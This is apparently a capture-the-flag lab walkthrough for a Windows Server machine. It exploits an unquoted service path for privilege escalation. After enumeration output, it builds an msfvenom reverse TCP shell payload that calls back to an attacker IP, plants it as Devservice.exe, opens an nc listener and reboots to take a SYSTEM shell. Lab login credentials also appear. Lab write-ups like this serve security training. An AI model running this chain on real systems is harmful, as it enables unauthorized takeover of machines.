IP 10.10.61.31

Access the machine using RDP with the following credentials:

Username: sage

Password: gr33ntHEphgK2&V



C:\Users\Sage>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\Sage>net user sage
User name                    Sage
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/19/2022 10:35:44 AM
Password expires             Never
Password changeable          7/19/2022 10:35:44 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/21/2022 3:04:14 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users *Users
Global Group memberships     *None
The command completed successfully.


C:\Users\Sage>systeminfo

Host Name:                 THM-QUOTIENT
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-70000-00000-AA092
Original Install Date:     3/7/2022, 2:33:36 AM
System Boot Time:          11/21/2022, 2:57:34 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,096 MB
Available Physical Memory: 2,832 MB
Virtual Memory: Max Size:  5,504 MB
Virtual Memory: Available: 4,324 MB
Virtual Memory: In Use:    1,180 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\THM-QUOTIENT
Hotfix(s):                 6 Hotfix(s) Installed.
                           [01]: KB5013892
                           [02]: KB4535680
                           [03]: KB4577586
                           [04]: KB4589208
                           [05]: KB5015811
                           [06]: KB5014797
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.61.31
                                 [02]: fe80::7120:af55:5e99:1348
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Users\Sage>


C:\Program Files>sc qc "Development Service" state=all
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Development Service
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Development Files\Devservice Files\Service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Developmenet Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Program Files>

Upon boot (because of Start Type: AUTO_START) this service searches for the exe in this order:

C:\Program.exe
C:\Program Files\Development.exe
C:\Program Files\Development Files\Devservice.exe
C:\Program Files\Development Files\Devservice Files\Service.exe


create a payload

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.29.89 LPORT=4444 -f exe -o Devservice.exe       
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: Devservice.exe

copy the file to C:\Program Files\Development Files>

start a nc listener on port 4444: nc -lvnp 4444

restrat the windows machine:
shutdown /r /t 0

get the shell and read the flag.